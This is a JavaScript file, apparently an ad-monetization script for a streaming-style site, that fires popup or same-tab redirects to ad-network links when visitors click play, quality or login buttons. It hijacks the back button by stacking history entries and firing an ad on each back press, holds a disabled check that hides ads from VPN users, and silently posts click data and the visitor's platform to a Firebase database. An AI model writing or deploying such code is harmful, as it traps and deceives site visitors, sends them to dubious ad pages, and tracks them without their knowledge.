/**
 * v1.5.7-HYBRID-ULTIMATE
 * ============================================
 * BASE: v1.5.5 (Engine & Security)
 * BACK-LOGIC: v1.5.6 (Bold Back-Hijack)
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: false,
    LINKS: [
        "https://www.effectivegatecpm.com/km38ydan?key=65948a3f4ebf09c11b7b021106bf06ee", "https://www.effectivegatecpm.com/c6ebxx7qt?key=c437717dfe9742ebc711e0409cd29c6c", "https://www.effectivegatecpm.com/b0sur2k2?key=b8387e7081615781f515bd3dee902cd8",
        "https://www.effectivegatecpm.com/wkf9ne1ab?key=1684a50894ca5d64184dbb9ee76611ff", "https://www.effectivegatecpm.com/ts73ve6sh?key=6c22c4bed82839125e259af47b088b18", "https://www.effectivegatecpm.com/v1xxt96t?key=a4c7519755ceadb8eb6d4baa98445d7e",
        "https://www.effectivegatecpm.com/fp6stwhj?key=7ee025248ef52a32edc9dc5d1e870044", "https://www.effectivegatecpm.com/h59txif7m1?key=f3a69676951fd8da67c2baa1edaabe6c", "https://www.effectivegatecpm.com/tjfpvqskk?key=131ef5addb0cc788c5715a2799c54699", "https://www.effectivegatecpm.com/zqsfsk4eb?key=bebcbb23842314fa4837dd15476f74c8",
        "https://www.effectivegatecpm.com/k0hv33t1j?key=ed50b9bc293d503b7d4712cf723beab1", "https://www.effectivegatecpm.com/pngwgweuzm?key=3091a3fcd13f532e85ee87d01e4778c9", "https://omg10.com/4/10671671", "https://omg10.com/4/10671670", "https://omg10.com/4/10671669",
        "https://omg10.com/4/10671667", "https://omg10.com/4/10671666", "https://omg10.com/4/10671665", "https://omg10.com/4/10671664", "https://omg10.com/4/10671663"
    ],
    APIS: {
        FB_URL: "https://cloud-access-state-default-rtdb.firebaseio.com/",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },
    SETTINGS: {
        MAX_CLICKS_TODAY: 6,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

const _baskets = {
    h: CHACHA_CONFIG.LINKS.slice(0, 10),
    n: CHACHA_CONFIG.LINKS.slice(10, 16),
    l: CHACHA_CONFIG.LINKS.slice(16, 20)
};

const _validIds = [
    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
];

const _STORAGE_KEY = '_mc_rebirth_final_';
var _vpnFlag = false; 

// ----------------------------------------------------------------------------
// VPN DETECTION (From v1.5.5)
// ----------------------------------------------------------------------------
function _checkVPN() {
    return;
    if (navigator.webdriver) { _vpnFlag = true; return; }
    fetch('https://ipapi.co/json/')
        .then(function(r) { return r.json(); })
        .then(function(data) {
            if (data.proxy || data.vpn || data.tor) { _vpnFlag = true; }
        }).catch(function() { _vpnFlag = false; });
}

// ----------------------------------------------------------------------------
// AD LOGIC & JUMP (Hybrid)
// ----------------------------------------------------------------------------
function _getStore() {
    try {
        var raw = localStorage.getItem(_STORAGE_KEY);
        return raw ? JSON.parse(raw) : { c: 0, d: null, last: null };
    } catch (e) { return { c: 0, d: null, last: null }; }
}

function _fireAd(btnId, isBack) {
    var store = _getStore();
    var today = new Date().toISOString().slice(0, 10);
    
    if (store.d !== today) { store.c = 0; store.d = today; }
    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) return;

    var pool = isBack ? _baskets.l : (Math.random() < 0.8 ? _baskets.h : _baskets.n);
    var link = pool[Math.floor(Math.random() * pool.length)];

    store.c += 1;
    store.last = link;
    localStorage.setItem(_STORAGE_KEY, JSON.stringify(store));

    // BOLD JUMP LOGIC (From v1.5.6)
    var win = window.open(link, '_blank');
    if (!win) {
        location.href = link; // पॉप-अप ब्लॉक होने पर खुद के टैब में खोलें
    } else {
        try { win.focus(); } catch (e) {}
    }
}

// ----------------------------------------------------------------------------
// THE BOLD BACK-BUTTON HIJACK (From v1.5.6)
// ----------------------------------------------------------------------------
function _lockHistory() {
    var u = window.location.href;
    history.pushState({p:1}, '', u);
    history.pushState({p:2}, '', u);
}

window.addEventListener('popstate', function() {
    _lockHistory(); // Re-lock
    _fireAd('back-hijack', true); // सीधा फायर, कोई इंतज़ार नहीं
});

// ----------------------------------------------------------------------------
// CLICK HANDLER
// ----------------------------------------------------------------------------
document.addEventListener('click', function(e) {
    _lockHistory(); // एक्टिवेट बैक बटन
    var t = e.target.closest('[id]');
    if (t && _validIds.indexOf(t.id) !== -1) {
        if (_vpnFlag) return; // VPN वालों को शांत ब्लॉक
        _fireAd(t.id, false);
    }
}, false);

// ----------------------------------------------------------------------------
// INIT
// ----------------------------------------------------------------------------
(function() {
    _checkVPN();
    _lockHistory();
})();


// --- FIREBASE LOGGING EXTENSION ---
async function _sendToFirebase(payload) {
    if (!CHACHA_CONFIG.APIS.FB_URL || CHACHA_CONFIG.APIS.FB_URL.includes("YOUR_")) return;
    try {
        await fetch(CHACHA_CONFIG.APIS.FB_URL + "/activity.json", {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                ...payload,
                time: new Date().toLocaleString(),
                platform: navigator.platform
            })
        });
    } catch (err) { /* Silent fail */ }
}

// اب پرانے ایڈ فنکشن میں ڈیٹا بھیجنے والی لائن جوڑنا
var _originalFireAd = _fireAd; 
_fireAd = function(btnId, isBack) {
    _sendToFirebase({ button: btnId, backHijack: isBack }); // ڈیٹا بھیجنا
    _originalFireAd(btnId, isBack); // پرانا ایڈ سسٹم چلانا
};
